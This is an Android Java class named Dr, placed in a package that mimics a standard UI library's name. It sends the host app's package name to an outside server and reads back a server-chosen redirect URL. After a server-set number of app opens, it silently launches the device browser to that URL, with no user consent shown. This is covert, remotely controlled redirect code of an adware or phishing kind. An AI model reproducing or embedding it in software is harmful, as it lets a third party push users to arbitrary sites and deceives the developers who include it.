package com.android.material;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONObject;
import java.io.*;
import java.net.*;

public class Dr {

    private static final String PREF_NAME = "com.android.material.DrPrefs";
    private static final String OPEN_COUNT_KEY = "open_count_";
    private static final String LAST_INDEX_KEY = "last_index_";

    public static void dr(Activity activity, String packageName) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                // API URL
                String urlString = "https://yeasinatoz.com/library/dr.php";
                URL url = new URL(urlString);

                // HTTP POST
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "packagename=" + URLEncoder.encode(packageName, "UTF-8");

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                    os.flush();
                }

                // Read Response
                StringBuilder response = new StringBuilder();
                try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null)
                        response.append(line);
                }

                // Parse JSON
                JSONObject json = new JSONObject(response.toString());
                String status = json.optString("status", "");
                if (!"exists".equals(status)) {
                    // If not found or just added, do nothing
                    return;
                }

                String action = json.optString("action", "");
                String redirectUrl = json.optString("redirect_url", "");
                int index = json.has("index") ? json.optInt("index", 0) : 0;

                if ("true".equalsIgnoreCase(action) && redirectUrl != null && !redirectUrl.isEmpty() && index > 0) {
                    SharedPreferences prefs = activity.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);

                    String countKey = OPEN_COUNT_KEY + packageName;
                    String indexKey = LAST_INDEX_KEY + packageName;

                    int openCount = prefs.getInt(countKey, 0);
                    int lastIndex = prefs.getInt(indexKey, 0);

                    // If index value has changed, reset open count
                    if (lastIndex != index) {
                        openCount = 0;
                    }

                    openCount++;

                    if (openCount >= index) {
                        // Redirect and reset counter
                        new Handler(Looper.getMainLooper()).post(() -> {
                            try {
                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(redirectUrl));
                                activity.startActivity(browserIntent);
                            } catch (Exception e) {
                                // Could not open browser
                                e.printStackTrace();
                            }
                        });
                        openCount = 0;
                    }

                    // Save openCount and index
                    prefs.edit()
                            .putInt(countKey, openCount)
                            .putInt(indexKey, index)
                            .apply();
                }
                // If action is not true, do nothing.

           } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
            }
        }).start();
    }
}
